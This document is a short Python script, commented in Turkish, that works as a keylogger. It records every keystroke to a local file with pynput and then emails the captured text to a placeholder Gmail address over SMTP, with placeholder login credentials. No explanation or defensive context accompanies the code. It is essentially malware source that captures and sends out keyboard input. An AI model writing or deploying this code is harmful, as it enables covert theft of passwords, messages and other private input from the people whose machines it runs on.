import pynput
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener

# Klavye girişi kaydetmek için kullanılan işlev
def on_press(key):
    try:
        print('Tuş basıldı: {0}'.format(key.char))
        with open("tuslar.txt", "a") as f:
            f.write(key.char)
    except AttributeError:
        print('Tuş basıldı: {0}'.format(key))
        with open("tuslar.txt", "a") as f:
            f.write(str(key))

# Klavye dinleyiciyi başlat
with Listener(on_press=on_press) as listener:
    listener.join()

# Dosyayı oku
with open("tuslar.txt", "r") as f:
    content = f.read()

# E-posta ayarları
mail_sender = 'gonderici_mail@gmail.com'
mail_receiver = 'alici_mail@gmail.com'
mail_subject = 'Basılan Tuşlar'
mail_body = content

# E-posta oluşturma
message = MIMEMultipart()
message['From'] = mail_sender
message['To'] = mail_receiver
message['Subject'] = mail_subject
message.attach(MIMEText(mail_body, 'plain'))

# SMTP sunucusuna bağlanma ve e-posta gönderme
try:
    smtp_obj = smtplib.SMTP('smtp.gmail.com', 587)
    smtp_obj.starttls()
    smtp_obj.login(mail_sender, 'gonderici_mail_sifresi')
    smtp_obj.sendmail(mail_sender, mail_receiver, message.as_string())
    smtp_obj.quit()
    print("E-posta başarıyla gönderildi!")
except smtplib.SMTPException:
    print("E-posta gönderimi başarısız oldu.")
